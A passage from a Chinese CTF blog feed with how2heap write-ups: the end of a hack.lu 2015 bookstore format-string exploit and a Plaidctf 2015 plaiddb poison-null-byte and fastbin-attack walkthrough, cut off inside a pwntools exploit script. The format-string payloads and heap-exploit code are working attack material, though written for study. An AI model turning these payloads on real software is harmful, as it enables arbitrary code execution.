</code>出现了两次，长度为10的字符串<code>\nOrder 2: </code>出现了一次，故该函数额外向orderlist中填充了28个字节。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705205842961.png" alt="image-20200705205842961"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># phase 1</span></span><br><span class="line">menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># format string: overwrite fini_arrary with start, leak libc and stack</span></span><br><span class="line">payload = <span class="string">b&quot;%1920x%13$hn...%14$s,,,%28$llx&quot;</span>.ljust(<span class="number">0x90</span><span class="number">-28</span>, <span class="string">b&quot;A&quot;</span>).ljust(<span class="number">0x88</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x151</span>)</span><br><span class="line">menu(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x400B09&quot;)</span></span><br><span class="line">menu(<span class="string">b&quot;5&quot;</span> + p8(<span class="number">0x1</span>)*<span class="number">7</span> + p64(fini_array) + p64(puts_got))</span><br></pre></td></tr></table></figure><p><code>%1920x%13$hn</code>，使用start地址0x400780，双字节覆盖fini_array，<code>13$</code>取第13个参数，<code>hn</code>控制写入双字节。</p><p><code>%14$s</code>，打印puts_got。</p><p><code>%28$llx</code>，打印stack地址。多次调试可以发现，main函数<code>rbp-0x10</code>处，存在一个与栈地址固定偏移0xf0的栈地址，应该为此前函数遗留。</p><p>利用fgets将这些参数传到栈上。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705212508537.png" alt="image-20200705212508537"></p><h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h4><p>调试到第二轮次，计算此前泄露的栈地址与此次main函数返回地址偏移。</p><p>将one_gadget地址的低四字节，写到返回地址处，一次一个字节。因为双字节有偶发性printf崩溃，应该是打印长度过长了。(我这里使用的自编译的glibc2.26 without tcache)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0x40d82</span></span><br><span class="line">log.debug(<span class="string">&quot;one gadget: 0x%x&quot;</span> % one_gadget)</span><br><span class="line">p1 = one_gadget       &amp; <span class="number">0xff</span></span><br><span class="line">p2 = (one_gadget&gt;&gt;<span class="number">8</span>)  &amp; <span class="number">0xff</span></span><br><span class="line">p3 = (one_gadget&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">p4 = (one_gadget&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">part1 = p1</span><br><span class="line">part2 = p2-p1 <span class="keyword">if</span> p2 &gt; p1 <span class="keyword">else</span> <span class="number">256</span>-p1+p2</span><br><span class="line">part3 = p3-p2 <span class="keyword">if</span> p3 &gt; p2 <span class="keyword">else</span> <span class="number">256</span>-p2+p3</span><br><span class="line">part4 = p4-p3 <span class="keyword">if</span> p4 &gt; p3 <span class="keyword">else</span> <span class="number">256</span>-p3+p4</span><br><span class="line"></span><br><span class="line">menu(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">payload  = <span class="string">b&quot;%&quot;</span> + str(part1).encode(<span class="string">&quot;ascii&quot;</span>) + <span class="string">b&quot;x%13$hhn%&quot;</span> + str(part2).encode(<span class="string">&quot;ascii&quot;</span>) + <span class="string">b&quot;x%14$hhn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + str(part3).encode(<span class="string">&quot;ascii&quot;</span>) + <span class="string">b&quot;x%15$hhn%&quot;</span> + str(part4).encode(<span class="string">&quot;ascii&quot;</span>) + <span class="string">b&quot;x%16$hhn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span><span class="number">-28</span>, <span class="string">b&quot;A&quot;</span>).ljust(<span class="number">0x88</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x151</span>)</span><br><span class="line">menu(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x400B09&quot;)</span></span><br><span class="line">menu(<span class="string">b&quot;5&quot;</span> + p8(<span class="number">0x1</span>)*<span class="number">7</span> + p64(ret_addr) + p64(ret_addr+<span class="number">1</span>) + p64(ret_addr+<span class="number">2</span>) + p64(ret_addr+<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/hack.lu2015%20bookstore/exp.py">exploit</a></p><h3 id="关于fini-array"><a href="#关于fini-array" class="headerlink" title="关于fini_array"></a>关于fini_array</h3><p><code>LIBC_START_MAIN</code>函数在执行完main函数后，执行<code>exit-&gt;__run_exit_handlers</code>，在<code>__run_exit_handlers</code>中调用<code>__call_tls_dtors</code>函数和<code>__exit_funcs</code>函数列表，该列表默认情况下只有<code>dl_fini</code>。结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> flavor;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">void</span> (*at) (<span class="keyword">void</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*fn) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*fn) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705200936606.png" alt="image-20200705200936606"></p><p>其中idx在第一次遍历此列表时就变为0了，而且就算再将该值改为1，也不会再执行<code>fini_array</code>里的函数。后面再<code>dl_fini</code>里面也貌似有个防范多次执行的变量，可是这块过于复杂了对于我，再看下去势必要花不少时间且偏离方向了，日后再说吧。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.26/master elf/dl-fini.c _dl_fini(void)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>struct exit_function</code>里存储的指针也经过了某种防范。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705202457594.png" alt="image-20200705202457594"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>how2heap overlapping chunks</li><li><a href="https://bbs.pediy.com/thread-246783.htm">https://bbs.pediy.com/thread-246783.htm</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;overlapping-chunks&quot;&gt;&lt;a href=&quot;#overlapping-chunks&quot; class=&quot;headerlink&quot; title=&quot;overlapping chunks&quot;&gt;&lt;/a&gt;overlapping chunks&lt;/h2&gt;&lt;p&gt;溢出对unsortedbin中的&lt;code&gt;chunk-&amp;gt;size&lt;/code&gt;进行修改，造成堆块重叠。&lt;/p&gt;
&lt;h2 id=&quot;hack-lu2015-bookstore&quot;&gt;&lt;a href=&quot;#hack-lu2015-bookstore&quot; class=&quot;headerlink&quot; title=&quot;hack.lu2015 bookstore&quot;&gt;&lt;/a&gt;hack.lu2015 bookstore&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x3ff000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;程序是一个订书系统，在main函数开始处，连续分配3个0x80的空间，一个存储订单1——order1，一个存储订单2——order2，一个存储提示信息——info。有以下功能菜单&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1: Edit order 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2: Edit order 2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3: Delete order 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4: Delete order 2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5: Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Edit order 1/2：order1/order2使用fgetc读取字符串，读到&lt;code&gt;\n&lt;/code&gt;终止，所以这里存在溢出&lt;/p&gt;
&lt;p&gt;Delete order 1/2：free掉order1/order2。这里存在指针悬空&lt;/p&gt;
&lt;p&gt;Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出&lt;/p&gt;
&lt;p&gt;程序末尾&lt;code&gt;printf(info)&lt;/code&gt;存在可能的格式化字符串漏洞。&lt;/p&gt;
&lt;h3 id=&quot;overlapping-chunks-amp-amp-format-string-vulnerability&quot;&gt;&lt;a href=&quot;#overlapping-chunks-amp-amp-format-string-vulnerability&quot; class=&quot;headerlink&quot; title=&quot;overlapping chunks &amp;amp;&amp;amp; format string vulnerability&quot;&gt;&lt;/a&gt;overlapping chunks &amp;amp;&amp;amp; format string vulnerability&lt;/h3&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--poison_null_byte Plaidctf2015--plaiddb</title>
    <link href="http://hhdx.xyz/2020/07/03/How2heap-poison-null-byte-plaidctf2015-plaiddb/"/>
    <id>http://hhdx.xyz/2020/07/03/How2heap-poison-null-byte-plaidctf2015-plaiddb/</id>
    <published>2020-07-02T16:16:56.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Poison-null-byte"><a href="#Poison-null-byte" class="headerlink" title="Poison null byte"></a>Poison null byte</h2><p>关于堆块重叠，可以看这篇<a href="https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html">文章</a>，图文并茂。</p><p>glibc2.26中，在unlink宏中加入了<code>size==prev_size(next_chunk)</code>的检查，与下一chunk所存储的pre_size进行了比对，在<code>poison_null_byte.c</code>中相应的添加了<code>*(size_t*)(b+0x1f0) = 0x200</code>，可以绕过这个检查，所以how2heap的README中对glibc的要求是<code>&lt;2.26</code>应该是忘了改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">chunk b +------&gt; +----------+</span><br><span class="line">                 |          |</span><br><span class="line">                 +----------+ &lt;---------+ size</span><br><span class="line">                 |  0X200   |</span><br><span class="line">                 +----------+ &lt;---------+ b</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 +----------+  &lt;--------+ fake pre_size</span><br><span class="line">                 |  0X200   |</span><br><span class="line">                 +----------+</span><br><span class="line">                 |          |</span><br><span class="line">chunk c +------&gt; +----------+  &lt;--------+ pre_size</span><br><span class="line">                 |  0X210   |</span><br><span class="line">                 +----------+</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br><span class="line">                 |          |</span><br></pre></td></tr></table></figure><p><strong>触发unlink的流程</strong>：通过null byte溢出伪造完0x200的chunk后，此时该chunk存在于unsortedbin。再次分配0x100的b1时，遍历unsortedbin，该chunk被放入到smallbin中，unsortedbin里的chunk也就这一个，遍历结束无法分配。又通过查找binmap找到0x200的smallbin，这时触发的unlink，将该chunk从smallbin中取出。</p><a id="more"></a><p>原来我以为在unsortedbin中就直接split分配了，没有unlink操作，实际不是。</p><p>只有是last remainder且大小足够大，或exact fit才会直接进行分配，否则就只是将chunk各归其位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// split</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    ....<span class="comment">// split 然后分配</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">    ...<span class="comment">// 直接分配</span></span><br></pre></td></tr></table></figure><h2 id="Plaidctf2015-plaiddb"><a href="#Plaidctf2015-plaiddb" class="headerlink" title="Plaidctf2015 plaiddb"></a>Plaidctf2015 plaiddb</h2><h3 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p><strong>关键数据结构</strong></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200702231553911.png" alt="image-20200702231553911"></p><p>据说是用红黑树进行的节点的管理，我没看懂….只能看出来是个树，好在这不影响做题。</p><p><strong>功能</strong></p><p>这个程序有GET、PUT、DUMP、DEL、EXIT几个指令，主要关注PUT、DEL就好。</p><p>GET：输入节点key，输出</p><p>PUT：创建节点，输入key，content大小（也就是节点size），和content</p><p>DUMP：打印所有节点</p><p>DEL：通过key查找节点并删除</p><p><strong>涉及的分配与释放操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">malloc(0x38)</span><br><span class="line">malloc(0x8)</span><br><span class="line">malloc(0x9)</span><br><span class="line"></span><br><span class="line">PUT:</span><br><span class="line">malloc(0x38)</span><br><span class="line">malloc(0x...) func my_readline</span><br><span class="line">malloc(size)  content</span><br><span class="line"></span><br><span class="line">DEL:</span><br><span class="line">malloc(0x...) func my_readline</span><br><span class="line">free(key)</span><br><span class="line">free(content)</span><br><span class="line">free(data_struct)</span><br><span class="line">free(readline)# 找不到该key，将不会释放。内存泄漏</span><br></pre></td></tr></table></figure><p>其中程序中的my_readline（我给起的名）函数，分配变长字节的空间，不够的就<code>realloc(2*usable_size)</code>，所以它存在usable_size：0x18、0x38、0x78、0xf8、0x1f8…这样的分配序列。</p><p>同时该函数尾部存在<strong>null byte溢出</strong>。</p><h3 id="poison-null-byte-amp-amp-memory-leak"><a href="#poison-null-byte-amp-amp-memory-leak" class="headerlink" title="poison null byte &amp;&amp; memory leak"></a>poison null byte &amp;&amp; memory leak</h3><p><strong>memory leak</strong>: DEL函数中，my_readline中malloc的空间存储key，该key在没有找到的情况下，不会被释放。</p><p>我通过学习（copy）ctf-wiki中的解法，自己整了一套size。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|      1     |  &lt;-- 0x110</span><br><span class="line">+------------+</span><br><span class="line">|      2     |  &lt;-- 0xe0</span><br><span class="line">+------------+</span><br><span class="line">|      3     |  &lt;-- 0x70</span><br><span class="line">+------------+</span><br><span class="line">|      4     |  &lt;-- 0x100</span><br><span class="line">+------------+</span><br><span class="line">|      5     |  &lt;-- 0x100</span><br><span class="line">+------------+</span><br><span class="line">|      X     |  &lt;-- 任意分配后 chunk 防止 top 合并</span><br></pre></td></tr></table></figure><p>上面写的大小都是chunk size，包含chunk头。</p><p>通过叙说过程，说明其各个chunk的作用。</p><ol><li><p>依次分配1~5空间连续的chunk，释放1、3、4，顺序不重要。</p></li><li><p>4的大小就是my_readline的usable_size等于0xf8的情况，使用my_readline溢出覆盖<code>chunk5-&gt;pre_size</code>为0x360，也就是0x110+0xe0+0x70+0x100， 和覆盖<code>chunk5-&gt;size</code>的最低字节为0x00。</p><p><strong>而此次malloc不会被释放，所以也就不会被<code>_int_free</code>函数报错。</strong></p></li><li><p>释放chunk5，它会向前合并为0x460的块，放入unsortedbin中。</p></li><li><p>再次分配chunk1大小也就是0x100，就会将0x460切割，剩下的放回unsortedbin。这样就会在chunk2内就会被写入fd和bk，通过打印chunk2就可以获得unsortedbin的位于main_arena上的地址，也就知道了libc base。</p></li><li><p>chunk3在0x70的fastbin内安然无恙，再次分配在0xf0，覆盖chunk3的fd指针为<code>__malloc_hook-0x3</code>，两次分配0x68，写入one_gadget。（也就是fastbin attack）</p></li></ol><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>fastbin的fd指针不能随便覆盖，因为fastbin在分配过程中有以下检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.26/master 3599~3601</span></span><br><span class="line"><span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure><p>对将要使用的chunk进行size检查，chunksize宏将size低三位置0，fastbin_index宏在64位中忽略size低四位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc release/2.26/master 1289~1292</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc release/2.26/master 1600~1602</span></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>所以使用0x7f可以绕过该检查，在内存中libc的最高位字节通常就是0x7f。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200703005053188.png" alt="image-20200703005053188"></p><p>利用偏移将0x7f置于chunk-&gt;size的位置，伪造0x70的fastbin。如下图所示，将0x7fa03fe51bdd当成chunk的起始地址。这种手法据说在支持非对齐寻址的CISC指令集CPU中才可以，例如X86。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200703005257021.png" alt="image-20200703005257021"></p><p>覆盖chunk2的fd后。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200703003554526.png" alt="image-20200703003554526"></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>先前看ctf-wiki刚接触heap的时候，就遇到这题，真是花了我好长时间整明白。今天在how2heap里又遇到，使用了glibc2.26进行了测试，exp依旧可以，只需要改下偏移就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># for glibc 2.26 no-tcache</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">ready = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ready:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./datastore&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter command:\n&quot;</span>)</span><br><span class="line">    io.sendline(command)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter row key:\n&quot;</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">    num = int(io.recvuntil(<span class="string">&quot; bytes&quot;</span>).strip(<span class="string">b&quot; bytes&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recv(num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">key, size, content</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;PUT&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter row key:\n&quot;</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter data 